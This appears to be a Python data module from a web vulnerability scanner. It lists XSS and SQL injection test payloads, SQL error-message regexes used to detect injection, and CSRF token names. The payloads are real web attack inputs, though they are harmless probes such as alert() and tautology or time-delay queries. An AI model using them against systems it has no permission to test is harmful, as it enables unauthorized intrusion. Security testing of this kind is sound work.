# Common payloads for vulnerability testing

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "admin' --",
    "1' ORDER BY 1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' WAITFOR DELAY '0:0:5'--",
]

SQLI_ERROR_PATTERNS = [
    "mysql_fetch",
    "sql syntax",
    "unclosed quotation mark",
    "you have an error in your sql",
    "warning: mysql",
    "ODBC Driver",
    "ORA-[0-9]{5}",
    "PostgreSQL",
    "SQLite",
]

CSRF_CHECK_PATTERNS = [
    "csrf",
    "token",
    "authenticity_token",
    "csrf_token",
    "csrfmiddlewaretoken",
]